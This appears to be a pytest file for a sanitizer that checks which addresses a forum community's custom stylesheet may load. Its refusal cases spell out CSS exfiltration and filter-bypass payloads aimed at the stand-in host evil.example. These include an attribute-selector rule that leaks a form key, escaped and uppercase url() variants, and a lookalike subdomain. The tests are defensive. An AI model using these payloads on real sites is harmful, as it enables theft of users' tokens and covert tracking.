"""What a guild's stylesheet may load (ruqqus/helpers/guild_css.py, bug hunt 2026-10, M1): only pictures on the site's
bucket, judged on the text as it will be served."""
import pytest

from ruqqus.helpers.guild_css import NO_OUTSIDE, refusal

BUCKET = "i.laba.example"


@pytest.mark.parametrize("css", [
    "",
    ".post-title { color: #123456; }",
    "body { background: url(https://i.laba.example/a.png); }",
    "body { background: url('https://i.laba.example/a.png') no-repeat; }",
    'body { background-image: url("http://I.LABA.example/b.jpg"); }',
    "@media (max-width: 600px) { .x { color: red } }",
    "@keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }",
    ".x::after { content: \"hello\" }",
    ".a[title^=x] { color: red }",
    ".x { filter: url(#blur) }",
    ".x { background: url(data:image/png;base64,iVBORw0KGgo=) }",
    ".x { background: url('data:image/gif;base64,R0lGODlhAQABAAAAACw=') }",
])
def test_plain_rules_and_the_sites_own_pictures_are_fine(css):
    assert refusal(css, BUCKET) is None


@pytest.mark.parametrize("css", [
    "body { background: url(https://evil.example/a.png); }",
    "@media all { body { background: url(https://evil.example/a.png) } }",
    "input[name=formkey][value^=a] { background: url(//evil.example/a) }",
    "@font-face { font-family: x; src: url(https://evil.example/f.woff) }",
    "body { background: image-set(\"https://evil.example/a.png\" 1x) }",
    "body { background: -webkit-image-set(\"https://evil.example/a.png\" 1x) }",
    "body { background: cross-fade(url(https://i.laba.example/a.png), \"https://evil.example/b.png\") }",
    "body { background: image(\"https://evil.example/a.png\") }",
    "body { background: -moz-element(#x) }",
    "@import 'https://evil.example/x.css';",
    "@namespace svg 'https://evil.example/';",
    "body { background: url(/assets/a.png) }",
    "body { background: url(data:image/svg+xml;base64,AAAA) }",
    "body { background: url(data:text/html,<script>x</script>) }",
    "body { filter: url(#blur https://evil.example) }",
    "body { background: url(https://user:pw@i.laba.example/a.png) }",
    "body { background: url(https://i.laba.example.evil.example/a.png) }",
    "body { background: URL(https://evil.example/a.png) }",
    "body { background: url( https://evil.example/a.png }",
    "body { background: u\\72l(https://evil.example/a.png) }",
])
def test_anything_else_that_loads_an_address_is_refused(css):
    assert refusal(css, BUCKET) == NO_OUTSIDE


def test_without_a_bucket_no_picture_is_allowed():
    assert refusal("body { background: url(https://i.laba.example/a.png) }", "") == NO_OUTSIDE
